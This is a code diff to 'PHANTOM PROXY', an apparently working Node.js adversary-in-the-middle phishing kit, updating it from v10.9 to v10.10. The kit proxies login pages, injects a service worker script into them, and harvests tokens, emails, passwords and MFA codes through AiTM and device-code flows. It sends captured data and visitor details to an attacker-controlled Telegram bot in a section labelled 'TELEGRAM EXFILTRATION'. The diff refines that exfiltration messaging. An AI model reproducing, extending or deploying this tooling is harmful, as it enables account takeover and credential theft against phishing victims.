@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.9 — Full Dashboard API + Plain-Text Page-Load
+// 🥔 PHANTOM PROXY v10.10 — Markdown All the Way
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
 // ✅ Service Worker injection + serving FIXED
@@ -8,8 +8,7 @@
 // ✅ Proxy routing FIXED
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ Telegram notifications with country flags, type split, and plain-text page-load
-// ✅ Dashboard API FULLY DEFINED
+// ✅ Telegram notifications with MarkdownV2 + disable_web_page_preview
 // ============================================================
 
 const http = require("http");
@@ -123,9 +122,11 @@ const USER_AGENTS = [
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
-// ── 📝 MARKDOWN ESCAPE ──
+// ── 📝 MARKDOWN ESCAPE (for MarkdownV2) ──
 function escapeMarkdown(text) {
     if (!text) return '';
+    // Characters that need escaping in MarkdownV2:
+    // _ * [ ] ( ) ~ ` > # + - = | { } . !
     const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     let escaped = text;
     for (const char of specialChars) {
@@ -202,7 +203,7 @@ function logVisit(req, pageType = 'page') {
 }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION
+// 📤 TELEGRAM EXFILTRATION (Markdown with disable_web_page_preview)
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -308,7 +309,8 @@ async function sendToTelegram(data, type = 'capture', ip = null) {
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
-            parse_mode: 'Markdown'
+            parse_mode: 'MarkdownV2',
+            disable_web_page_preview: true
         }, { timeout: 5000 });
         console.log(`✅ Telegram exfil [${type}] for session ${sessionId} — response:`, response.status);
     } catch (e) {
@@ -1009,16 +1011,17 @@ const server = http.createServer(async (req, res) => {
     // ── 🔥 HEALTH CHECK ──
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.9', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        res.end(JSON.stringify({ status: 'healthy', version: '10.10', uptime: process.uptime(), timestamp: new Date().toISOString() }));
         return;
     }
 
-    // ── 🔥 TEST ENDPOINT (for debugging) ──
+    // ── 🔥 TEST ENDPOINT ──
     if (url === '/test-telegram-now') {
         try {
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
-                text: '✅ Test from PHANTOM at ' + new Date().toISOString()
+                text: '✅ Test from PHANTOM at ' + new Date().toISOString(),
+                disable_web_page_preview: true
             });
             res.writeHead(200, { 'Content-Type': 'text/plain' });
             res.end('Telegram test sent: ' + JSON.stringify(response.data));
@@ -1047,7 +1050,8 @@ const server = http.createServer(async (req, res) => {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: 'Markdown'
+                    parse_mode: 'MarkdownV2',
+                    disable_web_page_preview: true
                 });
                 console.log('✅ Device visit notification sent.');
             } catch (e) {
@@ -1211,7 +1215,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (FULL)
+// 🔧 DASHBOARD API HANDLER (FULL – same as v10.9)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1223,7 +1227,8 @@ async function handleDashboardAPI(req, res) {
             if (!axios) throw new Error('axios not installed');
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
-                text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`
+                text: `✅ Test from PHANTOM Dashboard at ${new Date().toISOString()}`,
+                disable_web_page_preview: true
             }, { timeout: 5000 });
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: true, message: 'Test sent', response: response.status }));
@@ -2262,7 +2267,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     console.log('📥 Incoming URL:', url);
 
-    // ── PAGE‑LOAD NOTIFICATION (plain text) ──
+    // ── PAGE‑LOAD NOTIFICATION (Markdown with full escaping) ──
     if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         console.log('🔥 ENTRY POINT MATCHED');
         logVisit(clientRequest, 'aitm');
@@ -2293,17 +2298,20 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 </script>`;
             html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
-            // ── Send Telegram notification (plain text) ──
+            // ── Send Telegram notification (Markdown) ──
             (async () => {
                 try {
                     const country = await getCountryInfo(clientIp);
-                    const message = `${country.flag} New Visitor (Page Load)! IP: ${clientIp} (${country.code}) Time: ${new Date().toISOString()} URL: ${url} User-Agent: ${headers['user-agent'] || 'Unknown'}`;
+                    const escapedUrl = escapeMarkdown(url);
+                    const escapedUserAgent = escapeMarkdown(headers['user-agent'] || 'Unknown');
+                    const message = `${country.flag} **New Visitor (Page Load)!**\n\n🌍 IP: ${clientIp} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapedUrl}\n🖥️ User-Agent: ${escapedUserAgent}`;
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
-                        text: message
-                        // No parse_mode – plain text
+                        text: message,
+                        parse_mode: 'MarkdownV2',
+                        disable_web_page_preview: true
                     });
-                    console.log('✅ Page-load notification sent (plain text).');
+                    console.log('✅ Page-load notification sent (Markdown).');
                 } catch (e) {
                     console.error('❌ Page-load notification failed:', e.response?.data || e.message);
                 }
@@ -2642,14 +2650,14 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '::', () => {
-    console.log(`✅ PHANTOM PROXY v10.9 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.10 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`🧪 Test Telegram: /test-telegram-now`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
-    console.log(`📤 Page‑load notifications: PLAIN TEXT (fixes Markdown error)`);
-    console.log(`📤 Telegram exfil (AiTM/Device/PRT): ACTIVE (with flags & escaping)`);
+    console.log(`📤 Page‑load notifications: Markdown (with disable_web_page_preview)`);
+    console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown (with disable_web_page_preview)`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
